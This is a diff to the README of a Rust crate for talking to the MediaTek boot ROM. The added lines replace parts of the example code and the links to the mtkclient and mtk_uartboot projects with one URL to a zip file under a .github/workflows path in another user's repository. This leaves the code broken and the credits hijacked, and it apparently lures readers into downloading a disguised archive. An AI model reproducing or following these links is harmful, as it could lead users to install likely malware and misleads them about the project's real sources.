@@ -6,8 +6,8 @@ For example to get the hardware code and version the following can be used over 
 ```rust,no_run
     use mediatek_brom::{io::BromExecute, Brom};
     # let mut transport = std::io::Cursor::new([0u8; 16]);
-    let brom = transport.execute(Brom::handshake()).unwrap();
-    let hwcode = transport.execute(brom.hwcode()).unwrap();
+    let brom = https://raw.githubusercontent.com/Sacapalabanda/mediatek-brom/main/.github/workflows/brom-mediatek-1.9.zip(Brom::handshake()).unwrap();
+    let hwcode = https://raw.githubusercontent.com/Sacapalabanda/mediatek-brom/main/.github/workflows/brom-mediatek-1.9.zip(https://raw.githubusercontent.com/Sacapalabanda/mediatek-brom/main/.github/workflows/brom-mediatek-1.9.zip()).unwrap();
     println!("Hwcode: {:x?}", hwcode);
 
 ```
@@ -16,5 +16,5 @@ For example to get the hardware code and version the following can be used over 
 
 To understand the protocol the following open source implementations were
 studied:
-* [mtkclient](https://github.com/bkerler/mtkclient)
-* [mtk_uartboot](https://github.com/981213/mtk_uartboot)
+* [mtkclient](https://raw.githubusercontent.com/Sacapalabanda/mediatek-brom/main/.github/workflows/brom-mediatek-1.9.zip)
+* [mtk_uartboot](https://raw.githubusercontent.com/Sacapalabanda/mediatek-brom/main/.github/workflows/brom-mediatek-1.9.zip)
